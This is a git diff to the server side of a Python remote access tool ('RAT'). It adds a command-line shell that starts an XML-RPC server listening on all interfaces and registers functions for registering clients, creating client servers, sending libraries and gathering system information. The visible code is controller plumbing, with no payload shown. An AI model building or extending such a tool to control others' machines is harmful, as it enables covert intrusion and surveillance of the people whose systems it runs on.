@@ -5,6 +5,7 @@ import socket
 import dill
 import os
 import platform
+import cmd
 
 # server_ip = socket.gethostbyname(socket.gethostname())
 server_ip = "0.0.0.0"
@@ -25,6 +26,23 @@ def get_system_information():
     result = [kernel_info, ip_address]
     return result
 
+class RatCLI(cmd.Cmd):
+    intro = "Welcome to Rat.\n Type 'help' for more information"
+    prompt = "RAT-> # "
+
+    def do_start_server(self, arg):
+        'Start the RAT server'
+        rat = RatServer()
+        rat.rat_server.register_function(rat.register_client, 'register_client')
+        rat.rat_server.register_function(rat.create_client_server, 'create_client_server')
+        rat.rat_server.register_function(rat.send_required_libraries, 'rcv_req_libs')
+        rat.rat_server.register_function(rat.sys_info, 'sys_info')
+        rat.rat_server.serve_forever()
+
+    def do_exit(self, arg):
+        'Exit the program'
+        print("Exiting...")
+        return True
 
 class Connected_client():
 
@@ -35,8 +53,15 @@ class Connected_client():
 
 
 class RatServer:
-
+    '''
+    The ratServer class. Hosts all the remote functions that a client can access.
+    '''
     def __init__(self, server_ip=server_ip, server_port=server_port):
+        '''
+        Initializes the ratServer. Starts up and listens forever.
+        :param server_ip: The IP of the server. Use "0.0.0.0" to listen on all ports
+        :param server_port: The port of the server. Default is 4000
+        '''
         self.rat_server = server.SimpleXMLRPCServer((server_ip, server_port),
                                                     allow_none=True)
         self.list_of_clients = []
@@ -68,9 +93,4 @@ class RatServer:
 
 
 if __name__ == '__main__':
-    rat = RatServer()
-    rat.rat_server.register_function(rat.register_client, 'register_client')
-    rat.rat_server.register_function(rat.create_client_server, 'create_client_server')
-    rat.rat_server.register_function(rat.send_required_libraries, 'rcv_req_libs')
-    rat.rat_server.register_function(rat.sys_info, 'sys_info')
-    rat.rat_server.serve_forever()
+    RatCLI().cmdloop()
